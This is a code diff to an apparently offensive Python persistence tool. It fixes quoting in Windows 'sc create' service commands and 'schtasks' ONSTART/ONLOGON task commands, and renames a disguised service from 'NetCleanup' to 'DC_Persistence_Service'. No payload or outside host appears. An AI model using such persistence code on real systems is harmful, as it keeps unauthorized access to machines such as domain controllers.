@@ -232,14 +232,13 @@ class WindowsService:
         print("=" * 40)
         
         try:
-            # === FIXED: Build proper sc create command using dynamic paths ===
-            # binPath must be: "path/to/script.py" [arguments]
+            # Format: binPath="full_path.py [args]" (all inside quotes)
             script_dir = PathAbstraction.get_script_directory()
             script_name = os.path.basename(self.path)
             full_path = os.path.join(script_dir, script_name)
             
-            # Format: binPath="full_path.py [args]"
-            binPath = f'"{full_path}" {self.args}'
+            # Include args inside the binPath quotes
+            binPath = f'"{full_path} {self.args}"'
             
             # Build complete command string
             command = (
@@ -259,17 +258,23 @@ class WindowsService:
                 print(f"[+] Start Type: AUTO")
                 print(f"[+] Script Path: {full_path}")
                 print(f"[+] Arguments: {self.args}")
-                print("[*] Run 'sc start NetCleanup' to start")
-                print("[*] Run 'sc stop NetCleanup' to stop")
-                print("[*] Run 'sc qc NetCleanup' to query")
+                print(f"[+] Full binPath: {binPath}")
+                print("[*] Run 'sc start DC_Persistence_Service' to start")
+                print("[*] Run 'sc stop DC_Persistence_Service' to stop")
+                print("[*] Run 'sc qc DC_Persistence_Service' to query")
                 return True
             else:
                 print(f"[!] Error creating service: {result.stderr}")
+                print(f"[!] Return Code: {result.returncode}")
+                print(f"[!] Full Command: {command}")
                 return False
-                
+                    
         except Exception as e:
             print(f"[!] Exception: {e}")
+            import traceback
+            print(traceback.format_exc())
             return False
+
     
     def uninstall(self):
         """Uninstall Windows Service."""
@@ -421,7 +426,6 @@ class PersistenceManager:
         # === Dynamic schtasks path using environment variables ===
         schtasks_exe = PathAbstraction.get_schtasks_path()
 
-        # === FIXED: Build command based on trigger ===
         # ONSTART/ONLOGON don't use /ST or /SD
         if trigger in ["ONSTART", "ONLOGON", "ONIDLE", "ONEVENT"]:
             command = f'{schtasks_exe} /Create /TN "{task_name}" /TR "python {script_path}" /RU "{run_as}" /SC {trigger} /F'
